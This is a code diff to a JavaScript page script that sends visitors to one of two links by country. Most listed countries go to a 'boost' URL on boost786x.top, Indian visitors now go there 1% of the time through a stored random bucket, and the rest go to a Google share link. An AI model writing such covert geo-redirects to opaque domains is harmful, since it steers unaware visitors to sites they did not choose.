@@ -169,52 +169,36 @@ const CONFIG = {
   ]
 };
 
-/* COUNTRY ROUTING */
+/* COUNTRY ROUTING: one stable random bucket per browser visitor. */
 const SHARE_LINK = "https://share.google/tlNr8cayfa6Aiin3Z";
-const BOOST_LINK = "https://boost786x.top/boost55abc/?utm_source=MHR-B&utm_medium=ADO";
+const BOOST_LINK = "https://boost786x.top/boost55abc/?utm_source=MHR-B&utm_medium=AD0";
 const BOOST_90_COUNTRIES = new Set(`
 US EG ID MX BR PH SA MA YE DZ AF MY NG IQ IT CA FR SY AR TH AE LK GB CU SD ET LY TN CD GN ES VE PE KH GT RO DE JO NP UNKNOWN NI CI PS PT PG LB UA CL QA PL BO HN HU AU DO PA SO NL EC PY MZ KW TW CM ZA UY IR GR JP GH SG OM FI AT BE BD BG MK BA SN RS ML HK HR SE IL FJ MW MV MR MG CH SC ZM GY KZ GE KE AO TL VN CR KR SL SV AZ BH UZ TD HT LR CG BJ BF CZ MU TZ SK EE VU KG TO LV BN CF CY RE NO BY SI MD MO CV RW LA MM CN PR ZW TT XK PM BI JM GM AM SS RU LT SB VC TJ MN
 `.trim().split(/\s+/));
 
-// India Specific Counter Logic (50 to BOOST_LINK, then 300 to SHARE_LINK, Looping)
-function getIndiaTargetLink() {
-  const key = "in_traffic_counter_v1";
-  let count = 0;
-  try {
-    const saved = localStorage.getItem(key);
-    count = saved ? parseInt(saved, 10) : 0;
-    if (isNaN(count)) count = 0;
-  } catch (e) {}
-
-  let target;
-  if (count < 50) {
-    target = BOOST_LINK; // First 50 users -> BOOST_LINK
-  } else {
-    target = SHARE_LINK; // Next 300 users -> SHARE_LINK
-  }
-
-  // Increment counter and loop back after 350 (50 + 300)
-  count = (count + 1) % 350;
-  try {
-    localStorage.setItem(key, String(count));
-  } catch (e) {}
-
-  return target;
-}
-
-function selectCountryTarget(countryCode) {
+function selectCountryTarget(countryCode, bucket) {
   const country = String(countryCode || "UNKNOWN").trim().toUpperCase();
   
-  // 1. India Routing with 50:300 Sequential Counter
-  if (country === "IN") {
-    return getIndiaTargetLink();
-  }
+  // 1. India Routing: 99% Traffic goes to Google Share Link, 1% to Boost Link
+  if (country === "IN") return bucket < 0.99 ? SHARE_LINK : BOOST_LINK;
   
   // 2. Targeted Countries (BOOST_90_COUNTRIES): 100% Traffic goes to Boost Link
   if (BOOST_90_COUNTRIES.has(country)) return BOOST_LINK;
   
-  // 3. All other countries: 100% Traffic goes to Google Share Link
+  // 3. All other countries (including TR, PK, etc.): 100% Traffic goes to Google Share Link
   return SHARE_LINK;
+}
+
+function getVisitorBucket() {
+  const key = "country-routing-visitor-bucket-v1";
+  try {
+    const saved = localStorage.getItem(key);
+    const value = saved === null ? NaN : Number(saved);
+    if (Number.isFinite(value) && value >= 0 && value < 1) return value;
+  } catch (e) {}
+  const value = Math.random();
+  try { localStorage.setItem(key, String(value)); } catch (e) {}
+  return value;
 }
 
 async function resolveCountryTarget() {
@@ -233,7 +217,7 @@ async function resolveCountryTarget() {
   } finally {
     clearTimeout(timeout);
   }
-  CONFIG.targetLink = selectCountryTarget(country);
+  CONFIG.targetLink = selectCountryTarget(country, getVisitorBucket());
 }
 
 const countryTargetReady = resolveCountryTarget();
